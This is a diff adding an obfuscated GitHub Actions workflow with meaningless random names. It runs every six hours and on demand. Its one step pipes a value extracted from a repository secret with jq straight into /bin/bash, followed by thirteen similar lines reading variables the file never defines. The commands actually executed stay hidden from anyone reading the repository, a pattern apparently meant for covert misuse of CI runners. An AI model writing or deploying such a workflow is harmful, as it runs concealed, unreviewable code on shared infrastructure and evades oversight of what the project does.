@@ -1,0 +1,30 @@
+name: eratchjiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: eratchjiao
+        env:
+          hzeq38976: ${{ secrets.hzeq38976 }}
+        run: |
+          echo $hzeq38976 | jq -r .jd2 | /bin/bash
+          echo $hrqta054 | jq -r .fgfkq8 | /bin/bash
+          echo $m5 | jq -r .zrl27368 | /bin/bash
+          echo $bnj871 | jq -r .gwc634 | /bin/bash
+          echo $sdjmt389 | jq -r .g1497 | /bin/bash
+          echo $d046 | jq -r .l56 | /bin/bash
+          echo $ajqdj79 | jq -r .pu40 | /bin/bash
+          echo $ugaag8420 | jq -r .dgeq63 | /bin/bash
+          echo $w231 | jq -r .kvcd053 | /bin/bash
+          echo $ilsbt486 | jq -r .mwswl9 | /bin/bash
+          echo $mv3 | jq -r .fmvob2855 | /bin/bash
+          echo $oy18585 | jq -r .grwf887 | /bin/bash
+          echo $vz64992 | jq -r .guebf58 | /bin/bash
+          echo $eslrn360 | jq -r .of4 | /bin/bash
+
